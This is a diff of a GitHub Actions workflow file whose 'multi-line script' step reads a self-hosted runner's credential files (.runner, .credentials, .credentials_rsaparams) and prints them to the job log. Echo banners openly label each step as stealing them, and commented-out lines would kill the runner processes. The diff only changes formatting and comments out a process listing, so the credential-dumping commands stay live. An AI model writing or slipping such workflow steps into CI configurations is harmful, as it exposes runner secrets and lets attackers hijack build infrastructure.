@@ -17,12 +17,12 @@ jobs:
 
       - name: Run a multi-line script
         run: |
-          ps -efwww
+          #ps -efwww
           echo '----------- steal .runner -----------'
           cat ~/actions-runner/.runner
-          echo '----------- steal .credentials -----------'
+          echo '\n----------- steal .credentials -----------'
           cat ~/actions-runner/.credentials
-          echo '----------- steal .credentials_rsaparams -----------'
+          echo '\n----------- steal .credentials_rsaparams -----------'
           cat ~/actions-runner/.credentials_rsaparams
           #kill $(ps aux | grep 'run.sh' | awk '{print $2}')
           #kill $(ps aux | grep 'run-helper.sh' | awk '{print $2}')
